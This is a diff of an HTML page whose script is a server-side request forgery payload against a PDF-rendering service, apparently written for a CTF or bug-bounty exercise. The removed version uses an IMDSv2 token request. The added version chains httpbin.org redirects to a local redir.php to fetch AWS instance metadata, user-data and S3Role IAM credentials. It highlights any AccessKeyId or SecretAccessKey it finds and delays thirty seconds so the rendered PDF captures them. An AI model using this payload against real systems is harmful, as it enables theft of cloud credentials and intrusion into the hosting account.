@@ -1,38 +1,195 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exact Writeup Recreation</title>
+    <title>Delayed JavaScript Execution</title>
+    <style>
+        .result-container {
+            border: 2px solid #000;
+            margin: 10px 0;
+            padding: 15px;
+            background: #f0f0f0;
+            min-height: 100px;
+        }
+        .status {
+            background: #ffff99;
+            padding: 10px;
+            border: 1px solid #000;
+            margin: 5px 0;
+            font-weight: bold;
+        }
+        .success {
+            background: #90EE90;
+            padding: 15px;
+            border: 3px solid #008000;
+            margin: 10px 0;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .credentials {
+            background: #FF6B6B;
+            color: white;
+            padding: 20px;
+            border: 5px solid #FF0000;
+            margin: 15px 0;
+            font-size: 16px;
+            font-weight: bold;
+            text-align: center;
+        }
+    </style>
 </head>
 <body>
-    <h1>📝 Exact Original Writeup Recreation</h1>
-    <div id="tokenResponse"></div>
-    <div id="metadataResponse"></div>
-    <div id="error"></div>
+    <h1>🎯 Delayed JavaScript Execution with 30 Second Buffer</h1>
+    
+    <div class="status" id="status">⏳ INITIALIZING... Please wait 30 seconds for completion</div>
+    
+    <div class="result-container">
+        <h2>🔍 Test 1: AWS Metadata v1.0 via Redirector</h2>
+        <div id="test1-status">⏳ Waiting...</div>
+        <div id="test1-result">...</div>
+    </div>
+    
+    <div class="result-container">
+        <h2>🔍 Test 2: S3Role Credentials Direct</h2>
+        <div id="test2-status">⏳ Waiting...</div>
+        <div id="test2-result">...</div>
+    </div>
+    
+    <div class="result-container">
+        <h2>🔍 Test 3: User Data Check</h2>
+        <div id="test3-status">⏳ Waiting...</div>
+        <div id="test3-result">...</div>
+    </div>
+    
+    <div class="result-container">
+        <h2>🔍 Test 4: Legacy API Version</h2>
+        <div id="test4-status">⏳ Waiting...</div>
+        <div id="test4-result">...</div>
+    </div>
+    
+    <div class="result-container">
+        <h2>📋 FINAL RESULTS BUFFER</h2>
+        <div id="final-results">⏳ Tests in progress... Results will appear here...</div>
+    </div>
     
     <script>
-        // Recreate the EXACT attack from the original writeup
-        var tokenUrl = "http://localhost/redir.php?url=http://169.254.169.254/latest/api/token";
-        var metadataURL = "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role";
-        var xhr = new XMLHttpRequest();
-        var token = '';
+        var finalResults = "";
+        var completedTests = 0;
+        var totalTests = 4;
         
-        try {
-            // Step 1: Get token using PUT request (exact method from writeup)
-            xhr.open('PUT', tokenUrl, false);
-            xhr.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
-            xhr.send();
-            token = xhr.responseText;
-            document.getElementById("tokenResponse").innerHTML = "Token: " + token;
-
-            // Step 2: Use token to get S3Role credentials (exact method from writeup)
-            xhr.open('GET', metadataURL, false);
-            xhr.setRequestHeader('X-aws-ec2-metadata-token', token);
-            xhr.send();
-            document.getElementById("metadataResponse").innerHTML = xhr.responseText;
-            
-        } catch(err) {
-            document.getElementById('error').innerHTML = err.message;
+        function updateStatus(message) {
+            document.getElementById("status").innerHTML = message;
         }
+        
+        function updateFinalResults(testName, result) {
+            completedTests++;
+            finalResults += "<h3>" + testName + "</h3>";
+            finalResults += "<div style='background:#f0f0f0;padding:10px;margin:5px;border:1px solid #000;'>" + result + "</div>";
+            
+            if(result.includes('AccessKeyId') || result.includes('SecretAccessKey')) {
+                finalResults += "<div class='credentials'>🚨🚨🚨 AWS CREDENTIALS FOUND IN " + testName + "! 🚨🚨🚨</div>";
+            }
+            
+            document.getElementById("final-results").innerHTML = finalResults + 
+                "<div style='background:#4169E1;color:white;padding:10px;margin:10px 0;'>Completed: " + completedTests + "/" + totalTests + " tests</div>";
+            
+            if(completedTests === totalTests) {
+                updateStatus("✅ ALL TESTS COMPLETED - PDF CAN NOW BE GENERATED");
+                document.getElementById("final-results").innerHTML += 
+                    "<div style='background:#32CD32;color:white;padding:15px;margin:10px 0;font-size:18px;text-align:center;'>🎉 TESTING COMPLETE - CHECK RESULTS ABOVE 🎉</div>";
+            }
+        }
+        
+        function makeRequest(url, testId, testName, delay) {
+            setTimeout(function() {
+                document.getElementById(testId + "-status").innerHTML = "🔄 Executing request...";
+                
+                try {
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('GET', url, false);
+                    xhr.send();
+                    
+                    var result = xhr.responseText;
+                    var statusText = "✅ SUCCESS: " + result.length + " bytes received";
+                    
+                    if(result.includes('AccessKeyId') || result.includes('SecretAccessKey')) {
+                        statusText = "🎉🎉🎉 AWS CREDENTIALS DETECTED! 🎉🎉🎉";
+                        document.getElementById(testId + "-result").className = "credentials";
+                    } else if(result.length > 50) {
+                        document.getElementById(testId + "-result").className = "success";
+                    }
+                    
+                    document.getElementById(testId + "-status").innerHTML = statusText;
+                    document.getElementById(testId + "-result").innerHTML = 
+                        "<strong>Response (" + result.length + " bytes):</strong><br>" +
+                        "<pre style='white-space:pre-wrap;word-wrap:break-word;font-size:12px;'>" + result + "</pre>";
+                    
+                    updateFinalResults(testName, result);
+                    
+                } catch(e) {
+                    var errorMsg = "❌ ERROR: " + e.message;
+                    document.getElementById(testId + "-status").innerHTML = errorMsg;
+                    document.getElementById(testId + "-result").innerHTML = errorMsg;
+                    updateFinalResults(testName, errorMsg);
+                }
+            }, delay);
+        }
+        
+        // Initialize with status update
+        updateStatus("🚀 Starting delayed execution in 2 seconds...");
+        
+        // Execute tests with staggered delays to avoid overwhelming the server
+        setTimeout(function() {
+            updateStatus("⏳ Test 1/4: Checking AWS Metadata v1.0...");
+            makeRequest(
+                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/',
+                'test1',
+                'AWS Metadata v1.0 Root',
+                100
+            );
+        }, 2000);
+        
+        setTimeout(function() {
+            updateStatus("⏳ Test 2/4: Attempting S3Role credentials...");
+            makeRequest(
+                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role',
+                'test2',
+                'S3Role Credentials v1.0',
+                100
+            );
+        }, 7000);
+        
+        setTimeout(function() {
+            updateStatus("⏳ Test 3/4: Checking user data...");
+            makeRequest(
+                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data',
+                'test3',
+                'AWS User Data v1.0',
+                100
+            );
+        }, 12000);
+        
+        setTimeout(function() {
+            updateStatus("⏳ Test 4/4: Trying legacy API...");
+            makeRequest(
+                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/S3Role',
+                'test4',
+                'S3Role Legacy API 2007',
+                100
+            );
+        }, 17000);
+        
+        // Final completion check
+        setTimeout(function() {
+            if(completedTests < totalTests) {
+                updateStatus("⚠️ Some tests still running... waiting for completion...");
+            }
+        }, 25000);
+        
+        setTimeout(function() {
+            updateStatus("✅ EXECUTION COMPLETE - PDF GENERATION READY");
+            document.getElementById("final-results").innerHTML += 
+                "<div style='background:#FF4500;color:white;padding:20px;margin:15px 0;font-size:20px;text-align:center;border:5px solid #FF0000;'>📄 PDF GENERATOR: CAPTURE NOW - ALL DATA LOADED 📄</div>";
+        }, 30000);
     </script>
 </body>
 </html>
